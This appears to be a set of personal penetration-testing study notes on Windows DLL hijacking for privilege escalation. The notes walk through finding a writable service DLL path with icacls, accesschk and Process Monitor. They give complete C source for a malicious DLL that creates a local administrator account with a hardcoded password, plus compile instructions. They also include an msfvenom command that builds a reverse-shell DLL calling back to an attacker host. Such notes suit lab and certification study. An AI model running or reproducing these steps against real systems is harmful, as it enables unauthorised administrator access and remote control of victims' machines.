
Replace a DLL with a malicious one so it runs at the start of a service instead, first we find a service that is vulnerable to DLL hijacking
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
Then check if we have write permissions, either using icacls or writing to it 
Use 'Process Monitor' to check all DLLs loaded for the service and any missing ones. We can hijack them or create our own in place of the missing. 
![[Pasted image 20260417164415.png]]

Use the bin icon to clear current logs, then locate a DLL and directory to upload
```shell
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
              i = system ("net user dave3 password123! /add");
              i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
Compile
```
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```


```
.\accesschk.exe /accepteula -uwcqv [user]
```

```
# DLL HIJACKING

[https://www.narycyber.com/posts/privilege-escalation/windows/service-misconfigurations/#insecure-service-permissions](https://www.narycyber.com/posts/privilege-escalation/windows/service-misconfigurations/#insecure-service-permissions)

move executable to vm testing machine

use procmon from sysinternals to check for missing dlls (“NAME NOT FOUND”)

Use Process Monitor filter "Process Name" is "dllhijackservice.exe" then "include"

deselect registry activity and network activity

start the service

1. The directory from which the application loaded 

2. 32-bit System directory (C:\Windows\System32) 

3. 16-bit System directory (C:\Windows\System) 

4. Windows directory (C:\Windows) 

5. The current working directory (CWD) 

6. Directories in the PATH environment variable (first system and then user)

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["RHOST"] %> LPORT=<% tp.frontmatter["LPORT"] %> -a x64 --platform Windows -f dll -o hijackme.dll
```